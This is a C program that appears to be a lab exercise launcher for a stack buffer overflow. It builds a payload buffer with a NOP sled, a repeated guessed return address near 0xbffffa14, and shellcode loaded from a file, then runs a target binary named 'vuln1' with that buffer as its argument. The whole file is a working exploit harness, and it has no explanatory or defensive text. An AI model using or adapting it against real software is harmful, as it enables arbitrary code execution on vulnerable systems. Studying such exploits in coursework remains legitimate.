#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>

#define NOP 0x90
#define MAX_FILE_SIZE 100

unsigned long get_sp(void) {
   __asm__("movl %esp,%eax");
}


int main(int argc, char **argv){
	//handle arguments
	if(argc<1){
		printf("Please provide at least a buffer size!\n");
		printf("Arguments: 1[opt:vulnerable file name] 2[file with exploit code] 3[buffer size] 4[offset] 5[nop size]\n");
		exit(0);
	}

	int buffer_size = 612;
	int offset = 0;
	int nop_size = 400;
	char *vulnerable_file = "vuln1";
	char *exploit_file = "expl1code.bin";
	
	if(argc>1)
		vulnerable_file = argv[1];
	if(argc>2)
		exploit_file = argv[2];
	if(argc>3)
		buffer_size = atoi(argv[3]);
	if(argc>4)
		offset = atoi(argv[4]);
	if(argc>5)
		nop_size = atoi(argv[5]);

	printf("Buffer size: 			%i\n", buffer_size);
	printf("Offset size: 			%i\n", offset);
	printf("Nop size: 			%i\n", nop_size);
	printf("Vulnerable File: 		%s\n", vulnerable_file);
	printf("Exploit File:			%s\n", exploit_file);

	char buff[buffer_size];
	long *addr_ptr, addr;

	addr = get_sp() - offset;
  	printf("SP address after offset:	0x%x\n", addr);

	int i;

  	addr_ptr = (long *) buff;
	//write the assummed address of the shellcode nop-sledge into the buffer
  	for (i = 0; i < buffer_size/4; i++){
    	//*(addr_ptr++) = addr;
		if(offset==0)addr_ptr[i] = 0xbffffa14;
		else addr_ptr[i] = addr;
	}
	
	//fill the beginning of the buffer with a nop-sledge
  	for (i = 0; i < nop_size; i++){
    	buff[i] = NOP;
	}


	//read exploit from file into buffer
	FILE *f;
	int file;

	unsigned char file_buffer[MAX_FILE_SIZE];
	int fsize;
	
//	f = fopen(exploit_file, "rb");
    file = open(exploit_file, O_RDONLY);
	if (file){
         fsize = read(file, file_buffer, MAX_FILE_SIZE);
//		 fsize = fread(file_buffer, MAX_FILE_SIZE, 1, f);
	}else{
	    // error opening file
		printf("Error opening file\n");
		exit(0);
	}
//	fclose(f);
	printf("File size is 			%i\n", fsize);	

	//write the shellcode into the buffer
  	for (i = nop_size; i < nop_size+fsize-1; i++){
    	buff[i] = file_buffer[i-nop_size];
	}

	//terminate the array
  	buff[buffer_size - 1] = '\0';

	char *const parmList[] = {vulnerable_file, buff, NULL};
	printf("\nExecuting program: 		%s\n\n", parmList[0]);
    execve(parmList[0], parmList, NULL);
  }

